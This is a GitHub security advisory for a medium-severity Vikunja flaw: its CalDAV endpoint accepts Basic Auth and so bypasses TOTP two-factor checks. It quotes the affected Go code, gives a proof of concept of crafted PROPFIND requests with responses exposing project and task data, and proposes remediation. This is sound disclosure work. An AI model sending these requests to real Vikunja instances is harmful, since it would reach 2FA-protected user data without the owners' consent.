# [M] Vikunja has a 2FA Bypass via Caldav Basic Auth

## Summary
Severity: Medium
Advisory: GHSA-47cr-f226-r4pq
CVE: CVE-2026-33315
CWE: CWE-288
Ecosystem: Go
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:L/VI:N/VA:N/SC:N/SI:N/SA:N (CVSS_V4)
Published: 2026-03-20
Source: https://github.com/advisories/GHSA-47cr-f226-r4pq
Type: github-advisory

## Affected
- Go: `code.vikunja.io/api` — affected >=0

## Details
### Summary
The Caldav endpoint allows login using Basic Authentication, which in turn allows users to bypass the TOTP on 2FA-enabled accounts. The user can then access standard project information that would normally be protected behind 2FA (if enabled), such as project name, description, etc.

### Details
The two files below show that when a user is accessing Caldav via Basic Authentication, it skips all steps involving 2FA. The order of operations is essentially:
1. Retrieve basic credentials.
2. Verify username.
3. Verify password.
4. Success

**pkg/routes/caldav/auth.go:45**
```go
u, err := checkUserCaldavTokens(s, credentials)
	if user.IsErrUserDoesNotExist(err) {
		return false, nil
	}
	if u == nil {
		u, err = user.CheckUserCredentials(s, credentials)
		if err != nil {
			log.Errorf("Error during basic auth for caldav: %v", err)
			return false, nil
		}
	}
```

**pkg/user/user.go:358**
```go
func CheckUserCredentials(s *xorm.Session, u *Login) (*User, error) {
	// Check if we have any credentials
	if u.Password == "" || u.Username == "" {
		return nil, ErrNoUsernamePassword{}
	}

	// Check if the user exists
	user, err := getUserByUsernameOrEmail(s, u.Username)
	if err != nil {
		// hashing the password takes a long time, so we hash something to not make it clear if the username was wrong
		_, _ = bcrypt.GenerateFromPassword([]byte(u.Username), 14)
		return nil, ErrWrongUsernameOrPassword{}
	}

	if user.Issuer != IssuerLocal {
		return user, &ErrAccountIsNotLocal{UserID: user.ID}
	}

	// The user is invalid if they need to verify their email address
	if user.Status == StatusEmailConfirmationRequired {
		return &User{}, ErrEmailNotConfirmed{UserID: user.ID}
	}

	// Check the users password
	err = CheckUserPassword(user, u.Password)
	if err != nil {
		if IsErrWrongUsernameOrPassword(err) {
			handleFailedPassword(user)
		}
		return user, err
	}

	return user, nil
}
```

### PoC
1. Setup a Docker instance of Vikunja `v2.1.0` and create an account. Enable 2FA on the account.
<img width="1506" height="646" alt="CleanShot 2026-03-16 at 15 30 24@2x" src="https://github.com/user-attachments/assets/e88522af-4333-4758-8ba4-3e34de9680f7" />

2. Logout of the account.
3. Using a web proxy, such as Burp Suite, craft an HTTP request to the endpoint similar to the one shown below. Ensure that the 2FA-enabled user's username and password is properly Base64-encoded and inserted into the `Authorization` header.

```http
PROPFIND /dav/principals/ HTTP/1.1
Host: 127.0.0.1:3456
Authorization: Basic {{ REDACTED }}
[ TRUNCATED ]

<?xml version="1.0"?><d:propfind xmlns:d="DAV:"><d:prop><d:displayname/><d:resourcetype/></d:prop></d:propfind>
```
5. Observe that the response contains authenticated user information.
```http
HTTP/1.1 207 Multi-Status
Content-Type: text/xml; charset=utf-8
Vary: Accept-Encoding
Date: Mon, 16 Mar 2026 19:31:47 GMT
Content-Length: 398

<?xml version="1.0" encoding="UTF-8"?><D:multistatus xmlns:D="DAV:" xmlns:C="urn:ietf:params:xml:ns:caldav" xmlns:CS="http://calendarserver.org/ns/"><D:response><D:href>/dav/projects</D:href><D:propstat><D:prop><D:displayname>projects</D:displayname>
[ TRUNCATED ]
```
6. Other requests can then be crafted to retrieve more information about a specific project, such as the one below.
```http
PROPFIND /dav/projects/1/{{ PROJECT NAME }}/ HTTP/1.1
Host: 127.0.0.1:3456
Authorization: Basic [ REDACTED ]
[TRUNCATED]

<?xml version="1.0"?><c:calendar-query xmlns:d="DAV:" xmlns:c="urn:ietf:params:xml:ns:caldav"><d:prop><d:getetag/><c:calendar-data/></d:prop><c:filter><c:comp-filter name="VCALENDAR"><c:comp-filter name="VTODO"/></c:comp-filter></c:filter></c:calendar-query>
```

```http
HTTP/1.1 207 Multi-Status
Content-Type: text/xml; charset=utf-8
[ TRUNCATED ]

[ TRUNCATED ]
<D:prop><C:calendar-data>BEGIN:VCALENDAR&#xA;VERSION:2.0&#xA;X-PUBLISHED-TTL:PT4H&#xA;X-WR-CALNAME:Inbox&#xA;PRODID:-//Vikunja Todo App//EN&#xA;BEGIN:VTODO&#xA;UID:8gb6eclz-dad5-4a38-80a8-09005707eb51&#xA;DTSTAMP:20260316T190905Z&#xA;SUMMARY:test&#xA;DESCRIPTION:&lt;p&gt;description&lt;/p&gt;&#xA;CREATED:20260301T203712Z&#xA;LAST-MODIFIED:20260316T190905Z&#xA;BEGIN:VALARM&#xA;TRIGGER;VALUE=DATE-TIME:20260316T130000Z&#xA;ACTION:DISPLAY&#xA;DESCRIPTION:test&#xA;END:VALARM&#xA;END:VTODO&#xA;END:VCALENDAR</C:calendar-data></D:prop><D:status>HTTP/1.1 200 OK
[ TRUNCATED ]
```

### Impact
Any user that has 2FA enabled could have it bypassed, allowing attacker access to a lot of the user's project information. 

### Remediation
If there are 2FA barriers to access an account in a specific fashion, all integrations should follow those if they're using the same methods of authentication. The easiest path is probably to disable Basic Authentication for Caldav by default, but keep the token access enabled, that way users can generate tokens specifically for Caldav if they want to use that feature. Basic Auth for it could be kept, but would most likely want to be a feature flag or something along those lines. That's so users can turn it on if it's necessary, but can be notified in the documentation that it's a more unsafe pattern if 2FA is enabled.

## References
- https://github.com/go-vikunja/vikunja/security/advisories/GHSA-47cr-f226-r4pq
- https://nvd.nist.gov/vuln/detail/CVE-2026-33315
- https://github.com/go-vikunja/vikunja/commit/cdf5d30a425d032f749b78b98b828f25ad882615
- https://github.com/go-vikunja/vikunja
- https://vikunja.io/changelog/vikunja-v2.2.0-was-released
